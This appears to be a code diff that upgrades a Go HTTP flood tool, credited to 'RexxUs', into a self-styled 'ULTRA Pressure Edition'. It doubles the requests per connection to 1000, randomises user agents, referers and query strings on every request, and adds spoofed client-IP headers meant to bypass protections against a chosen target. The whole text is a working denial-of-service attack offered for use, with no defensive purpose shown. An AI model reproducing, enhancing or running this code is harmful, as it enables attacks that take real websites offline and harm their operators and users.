@@ -1,7 +1,7 @@
 /*
 Coded by RexxUs
-Upgraded 2026 - High Pressure Edition
-Same structure, way more aggressive
+ULTRA Pressure Edition 2026
+Same structure - maximum aggression
 */
 
 package main
@@ -32,27 +32,17 @@ var (
 	errors   int64
 
 	acceptall = []string{
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9,id;q=0.8\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
 		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br\r\n",
-		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
 		"Accept: */*\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
+		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.9\r\nAccept-Encoding: gzip, deflate, br, zstd\r\n",
 	}
 
 	choice  = []string{"Macintosh", "Windows", "X11"}
 	choice2 = []string{"Intel Mac OS X 10_15_7", "Intel Mac OS X 14_5", "Intel Mac OS X 15_0", "Intel Mac OS X 15_1"}
 	choice3 = []string{"Windows NT 10.0; Win64; x64", "Windows NT 10.0; WOW64", "Windows NT 11.0; Win64; x64"}
 	choice4 = []string{"Linux x86_64", "X11; Ubuntu; Linux x86_64", "X11; Linux x86_64"}
-	choice5 = []string{"chrome", "firefox", "safari", "edge"}
-
-	spider = []string{
-		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-		"Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.85 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
-		"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
-	}
+	choice5 = []string{"chrome", "firefox", "edge", "safari"}
 
 	referers = []string{
 		"https://www.google.com/search?q=",
@@ -67,8 +57,6 @@ var (
 		"https://www.tiktok.com/",
 		"https://github.com/search?q=",
 		"https://news.ycombinator.com/",
-		"https://www.linkedin.com/",
-		"https://www.pinterest.com/search/pins/?q=",
 		"https://steamcommunity.com/market/search?q=",
 	}
 )
@@ -79,33 +67,28 @@ func init() {
 
 func getuseragent() string {
 	platform := choice[rand.Intn(len(choice))]
-	var os string
+	var osStr string
 	if platform == "Macintosh" {
-		os = choice2[rand.Intn(len(choice2))]
+		osStr = choice2[rand.Intn(len(choice2))]
 	} else if platform == "Windows" {
-		os = choice3[rand.Intn(len(choice3))]
+		osStr = choice3[rand.Intn(len(choice3))]
 	} else {
-		os = choice4[rand.Intn(len(choice4))]
+		osStr = choice4[rand.Intn(len(choice4))]
 	}
 
 	browser := choice5[rand.Intn(len(choice5))]
-
 	switch browser {
 	case "chrome":
-		major := 128 + rand.Intn(6) // 128-133
-		build := 1000 + rand.Intn(8000)
-		patch := rand.Intn(200)
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", os, major, build, patch)
+		major := 128 + rand.Intn(7)
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.%d.%d Safari/537.36", osStr, major, 1000+rand.Intn(8000), rand.Intn(200))
 	case "firefox":
-		ver := 130 + rand.Intn(6)
-		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", os, ver, ver)
-	case "safari":
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Safari/605.1.15", os, 1+rand.Intn(3))
+		ver := 130 + rand.Intn(7)
+		return fmt.Sprintf("Mozilla/5.0 (%s; rv:%d.0) Gecko/20100101 Firefox/%d.0", osStr, ver, ver)
 	case "edge":
-		major := 128 + rand.Intn(6)
-		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", os, major, major)
+		major := 128 + rand.Intn(7)
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%d.0.0.0 Safari/537.36 Edg/%d.0.0.0", osStr, major, major)
 	default:
-		return spider[rand.Intn(len(spider))]
+		return fmt.Sprintf("Mozilla/5.0 (%s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.%d Safari/605.1.15", osStr, 1+rand.Intn(3))
 	}
 }
 
@@ -131,8 +114,7 @@ func bypassHeaders() string {
 		"True-Client-IP: " + ip + "\r\n" +
 		"X-Originating-IP: " + ip + "\r\n" +
 		"X-Remote-IP: " + ip + "\r\n" +
-		"X-Remote-Addr: " + ip + "\r\n" +
-		"X-Forwarded-Host: " + host + "\r\n"
+		"X-Remote-Addr: " + ip + "\r\n"
 }
 
 func randString(n int) string {
@@ -145,55 +127,12 @@ func randString(n int) string {
 
 func flood() {
 	addr := host + ":" + port
-	header := ""
-
-	if mode == "get" {
-		header += " HTTP/1.1\r\nHost: " + host + "\r\n"
-		if os.Args[5] == "nil" {
-			header += "Connection: keep-alive\r\n"
-			header += "Cache-Control: no-cache\r\n"
-			header += "Pragma: no-cache\r\n"
-			header += "Upgrade-Insecure-Requests: 1\r\n"
-			header += "Sec-Fetch-Dest: document\r\n"
-			header += "Sec-Fetch-Mode: navigate\r\n"
-			header += "Sec-Fetch-Site: none\r\n"
-			header += "Sec-Fetch-User: ?1\r\n"
-			header += "User-Agent: " + getuseragent() + "\r\n"
-			header += acceptall[rand.Intn(len(acceptall))]
-			header += "Referer: " + referers[rand.Intn(len(referers))] + randString(10) + "\r\n"
-			header += bypassHeaders()
-		} else {
-			fi, err := os.Open(os.Args[5])
-			if err != nil {
-				return
-			}
-			defer fi.Close()
-			br := bufio.NewReader(fi)
-			for {
-				a, _, c := br.ReadLine()
-				if c == io.EOF {
-					break
-				}
-				header += string(a) + "\r\n"
-			}
-		}
-	} else if mode == "post" {
-		data := "f=" + randString(32)
-		header += "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\n"
-		header += "Connection: keep-alive\r\n"
-		header += "Content-Type: application/x-www-form-urlencoded\r\n"
-		header += "Content-Length: " + strconv.Itoa(len(data)) + "\r\n"
-		header += "User-Agent: " + getuseragent() + "\r\n"
-		header += acceptall[rand.Intn(len(acceptall))]
-		header += bypassHeaders()
-		header += "\r\n" + data + "\r\n"
-	}
-
-	var s net.Conn
-	var err error
 	<-start
 
 	for {
+		var s net.Conn
+		var err error
+
 		if port == "443" {
 			cfg := &tls.Config{
 				InsecureSkipVerify: true,
@@ -203,18 +142,39 @@ func flood() {
 			}
 			s, err = tls.Dial("tcp", addr, cfg)
 		} else {
-			s, err = net.DialTimeout("tcp", addr, 8*time.Second)
+			s, err = net.DialTimeout("tcp", addr, 6*time.Second)
 		}
 
 		if err != nil {
 			atomic.AddInt64(&errors, 1)
-			time.Sleep(time.Millisecond * 30)
 			continue
 		}
 
-		// === HEAVY PRESSURE ===
-		// Send a lot more requests per connection
-		for i := 0; i < 500; i++ {
+		// ===== ULTRA PRESSURE =====
+		for i := 0; i < 1000; i++ {
+			// Build fresh header every request for maximum randomness
+			header := ""
+			if mode == "get" {
+				header += " HTTP/1.1\r\nHost: " + host + "\r\n"
+				header += "Connection: keep-alive\r\n"
+				header += "Cache-Control: no-cache\r\n"
+				header += "Pragma: no-cache\r\n"
+				header += "User-Agent: " + getuseragent() + "\r\n"
+				header += acceptall[rand.Intn(len(acceptall))]
+				header += "Referer: " + referers[rand.Intn(len(referers))] + randString(12) + "\r\n"
+				header += bypassHeaders()
+			} else {
+				data := "f=" + randString(40)
+				header += "POST " + page + " HTTP/1.1\r\nHost: " + host + "\r\n"
+				header += "Connection: keep-alive\r\n"
+				header += "Content-Type: application/x-www-form-urlencoded\r\n"
+				header += "Content-Length: " + strconv.Itoa(len(data)) + "\r\n"
+				header += "User-Agent: " + getuseragent() + "\r\n"
+				header += acceptall[rand.Intn(len(acceptall))]
+				header += bypassHeaders()
+				header += "\r\n" + data
+			}
+
 			request := ""
 			if mode == "get" {
 				request += "GET " + page
@@ -223,12 +183,12 @@ func flood() {
 				} else {
 					request += "&"
 				}
-				// Heavy randomization
 				request += "r=" + strconv.Itoa(rand.Intn(2147483647)) +
 					"&_=" + strconv.FormatInt(time.Now().UnixNano(), 10) +
-					"&v=" + randString(8) +
-					"&id=" + randString(6) +
-					"&t=" + strconv.FormatInt(time.Now().Unix(), 10)
+					"&v=" + randString(10) +
+					"&id=" + randString(8) +
+					"&t=" + strconv.FormatInt(time.Now().Unix(), 10) +
+					"&sid=" + randString(6)
 			}
 			request += header + "\r\n"
 
@@ -249,7 +209,7 @@ func main() {
 	fmt.Println(" ||  ||    ||      ||     ||  ||      ||       ||  ||  || ||  || ||  ||  ")
 	fmt.Println(".||  ||.   `|..'   `|..'  ||..|'     .||.     .||. `|..|' `|..|' `|..||. ")
 	fmt.Println("                          ||                                             ")
-	fmt.Println("                         .||           Golang 2026 - High Pressure Edition")
+	fmt.Println("                         .||              ULTRA Pressure Edition 2026")
 	fmt.Println("==========================================================================")
 
 	if len(os.Args) != 6 {
@@ -301,16 +261,18 @@ func main() {
 	fmt.Printf("[+] Threads : %d\n", threads)
 	fmt.Printf("[+] Mode    : %s\n", mode)
 	fmt.Printf("[+] Time    : %d seconds\n", limit)
-	fmt.Println("[+] Starting High Pressure Flood...")
+	fmt.Println("[+] Starting ULTRA Pressure Flood...")
 
 	for i := 0; i < threads; i++ {
-		time.Sleep(time.Microsecond * 20) // even faster spawn
 		go flood()
-		fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
-		os.Stdout.Sync()
+		if i%50 == 0 {
+			fmt.Printf("\rThreads [%.0f] are ready", float64(i+1))
+			os.Stdout.Sync()
+		}
 	}
+	fmt.Printf("\rThreads [%.0f] are ready\n", float64(threads))
 
-	fmt.Println("\nFlood will end in " + os.Args[4] + " seconds.")
+	fmt.Println("Flood will end in " + os.Args[4] + " seconds.")
 	close(start)
 
 	go func() {
